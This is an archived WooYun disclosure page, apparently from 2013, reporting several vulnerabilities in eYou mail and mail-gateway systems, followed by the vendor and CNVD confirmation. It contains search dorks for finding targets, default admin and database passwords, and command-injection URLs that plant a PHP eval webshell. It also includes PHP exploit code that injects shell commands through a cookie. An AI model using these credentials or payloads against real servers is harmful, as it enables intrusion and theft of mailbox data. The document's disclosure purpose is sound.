@@ -1,0 +1,311 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		【国内数千机构邮箱的沦陷】eYou邮箱系统系列产品若干个漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		【国内数千机构邮箱的沦陷】eYou邮箱系统系列产品若干个漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/YwiSax">YwiSax</a> 
+</li><li>提交时间：		2013-04-10 11:50</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-04-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-02：	细节向普通白帽子公开<br/>
+									2013-05-12：	细节向实习白帽子公开<br/>
+									2013-05-25：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">eYou是目前国内机构（高校、政府、企业）使用率最高的邮箱系统之一。<br />
+今发现eYou邮件系统、eYou邮件网关系统有多处严重的安全隐患，攻击者可入侵服务器和盗取任意邮箱信息。<br />
+影响版本：2007年以后所有版本，包括最新版。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">** 查找目标<br />
+<br />
+google搜索以下关键词寻找使用eyou的目标<br />
+<br />
+&gt; intitle:亿邮通讯<br />
+<br />
+&gt; inurl:mail intext:蔚蓝天空<br />
+<br />
+或者只是搜索inurl:gw或者inurl:gate.等都可以搜索到。<br />
+<br />
+嗯，搜索inurl:mail site:edu.cn和inurl:mail site:gov.cn也可以找到目标。。。<br />
+<br />
+部分网站修改了默认的模版，不过只要看http://www.target.com/admin/还是可以很轻松判断是不是eYou。<br />
+<br />
+使用旧版的站比较多，绝对比例有95%以上。<br />
+<br />
+<br />
+<br />
+** 1.默认配置漏洞<br />
+<br />
+这里的情况旧版新版都存在。首先默认的网关系统是跟邮件系统在一个机器上的，访问8080端口即可。<br />
+<br />
+&gt; http://www.target.com/admin/<br />
+<br />
+&gt; 默认账户 admin aaaaa，部分站点还有eyoutest之类的账户，不知道是不是eyou的工作人员测试的时候留下忘记删除的账户，同样密码为aaaaa<br />
+<br />
+登录后直接导出所有用户。。。<br />
+<br />
+&gt; 默认LDAP信息：eyouadmin aaaaa<br />
+<br />
+&gt; 默认MySQL信息： root 密码空<br />
+<br />
+&gt; 网关后台http://www.target.com:8080/admin/或http://www.target.com:8080/gw/admin/<br />
+<br />
+&gt; 有三个默认账户，分别为<br />
+<br />
+&gt; admin:+-ccccc<br />
+<br />
+&gt; eyougw:admin@(eyou)<br />
+<br />
+&gt; eyouuser:eyou_admin<br />
+<br />
+网关处的管理员是存放在mysql中，可是eYou产品在安装过程中没有任何提示要求更改此处密码，算是官方留的后门吗？<br />
+<br />
+<br />
+<br />
+查看投递日志可以查看敏感信息。<br />
+<br />
+</p><p class="detail"><a href="../images/10114749fadc8ad1f69a15ca09a92bebb2b4da17.png" target="_blank"><img src="../images/10114749fadc8ad1f69a15ca09a92bebb2b4da17.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/10114851e97f5c3f0b21b5b567488de9e74fe61b.jpg" target="_blank"><img src="../images/10114851e97f5c3f0b21b5b567488de9e74fe61b.jpg" alt="eyou邮件后台.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+** 2.旧版网关漏洞<br />
+<br />
+网关系统这里问题挺严重的喔，只要能访问到网关，只要在网关处能查看到队列什么的，就能执行命令<br />
+<br />
+利用URL：<br />
+<br />
+&gt; php/mailaction1.php?action=x&amp;index=738952509.37684;echo &#039;&lt;?php eval($_REQUEST[cmd]) ?&gt;&#039;&gt;/opt/apache/htdocs/t1.php<br />
+<br />
+&gt; php/mailaction1.php?action=x&amp;index=738952509.37684;ls&gt;t1.php<br />
+<br />
+index参数没过滤，直接带入执行了。<br />
+<br />
+旧版网关很多处地方有类似问题的，认真看下代码就发现了。<br />
+<br />
+入侵者得到webshell之后，直接使用/var/eyou/sbin/userdb_extract domain就能导出该域下所有用户的账户信息！<br />
+<br />
+这里的影响版本貌似是3.6-4.0<br />
+<br />
+</p><p class="detail"><a href="../images/10114916544f6bdfb98df79f7b639c8c642ecc05.jpg" target="_blank"><img src="../images/10114916544f6bdfb98df79f7b639c8c642ecc05.jpg" alt="QQ截图20130409204109.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+** 3.新版网关漏洞<br />
+<br />
+新版网关比旧版的要安全多了。。。不过它之所以安全多了，是因为把代码写复杂了。。。把要研究的人都给绕晕了。。。<br />
+<br />
+顺便吐槽下这个新旧版本代码变化也太大了把。。。<br />
+<br />
+用前面发现的账户登录网关后台。我抓了一大堆网址，然后自己写脚本来模拟登录，20+个站点没有一个修改了该处的密码。。。所以这里新版后台登录的成功率是很高的。<br />
+<br />
+<br />
+<br />
+新版本的网关，对用户默认输入的参数都进行了过滤，过滤了&lt;、&gt;什么的，然后注射啊命令执行什么的暂时还木有发现。<br />
+<br />
+不过在管理配置那里的风格管理，对上传的风格包，系统没有任何判断就直接覆盖到gw/css/目录去了。<br />
+<br />
+然后入侵者就简单了，用上面的后门账户登录网关后台，下载默认的风格包，解压后加入php文件，然后上传覆盖。。。ok，getshell成功，然后就没然后了。<br />
+<br />
+影响版本为网关4.0以后的版本<br />
+<br />
+</p><p class="detail"><a href="../images/101149348d3e0f5b5178870d64ce30172baa0e24.jpg" target="_blank"><img src="../images/101149348d3e0f5b5178870d64ce30172baa0e24.jpg" alt="getshell.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+** 4.邮箱系统远程执行漏洞<br />
+<br />
+前面三个项目都或多或少都有条件限制，不够劲爆，再来个劲爆的，只要邮箱对外访问，就能直接getshell。<br />
+<br />
+问题在http://www.target.com/grad/admin/domain_logo.php这里，这个文件直接读取Cookie(&quot;cookie&quot;)，然后就带入popen了，没任何过滤，多好啊。<br />
+<br />
+exp可以参考下面的代码来写，很简单很弱智的漏洞<br />
+<br />
+</p><pre><code>public function action_test()<br />
+	{<br />
+		$domain = $_GET[&#039;domain&#039;];<br />
+		$url = &quot;http://$domain/grad/admin/domain_logo.php&quot;;<br />
+		$cmd = &quot;ls&gt;test.txt&quot;;<br />
+		$req = Request::factory($url)<br />
+			-&gt;cookie(&#039;cookie&#039;, &quot;/php/lib/;$cmd&quot;)<br />
+			//-&gt;send_headers()<br />
+			-&gt;execute();<br />
+		echo $domain;<br />
+		echo &#039;&lt;br /&gt;&#039;;<br />
+		echo $cmd;<br />
+		//echo &#039;&lt;br /&gt;&#039;;<br />
+		//$remote_url = &quot;http://$domain/grad/admin/test.txt&quot;;<br />
+		//$rs = file_get_contents($remote_url);<br />
+		//echo $rs ? &#039;Has bug!&#039; : &#039;No bug!&#039;;<br />
+		//$req2 = Request::factory($url)<br />
+		//	-&gt;cookie(&#039;cookie&#039;, &quot;/php/lib/;rm test.txt&quot;)<br />
+			//-&gt;send_headers()<br />
+		//	-&gt;execute();<br />
+		exit;<br />
+	}</code></pre><p class='detail'><br />
+<br />
+利用上面几个漏洞，只要是使用eYou的邮箱系统，就99%会被入侵。看客请自重。<br />
+<br />
+写得不好，看懂怎么回事就行了、、、 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">亲测吧，各位。<br />
+<br />
+前段时间已经发了细节给厂商。<br />
+<br />
+话说亿邮你能不能重视一下下，都是用户数据啊。。。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">更新到最新版本。<br />
+<br />
+或者干脆点，换其他的邮箱系统吧，CoreMail、AnyMacro等等都可以。。。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/YwiSax" title="YwiSax">YwiSax</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-021473" title="【国内数千机构邮箱的沦陷】eYou邮箱系统系列产品若干个漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-04-12 17:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现所述情况，同时已联系上软件生产厂商，根据实测情况以及厂商反馈的产品信息，对白帽子所述情况进行一个更新：<br />
+<br />
+所述“影响版本：2007年以后所有版本，包括最新版”以及“影响版本为网关4.0以后的版本”。通过实测情况，暂时不能确认这样的情况；目前，电子邮件产品受影响涉及V4部分版本，电子邮件网关产品受影响涉及V3.6-4.0版本。<br />
+<br />
+软件生产厂商已经积极响应，预计在一至两周内提供完善的修复方案，同时根据CNVD处置流程要求做好用户的点对点修复工作。<br />
+<br />
+此外，根据后续源码分析情况，发现另一处远程代码执行风险点。<br />
+<br />
+按多个漏洞进行评分，rank 40？请xsser决定。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="21473";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
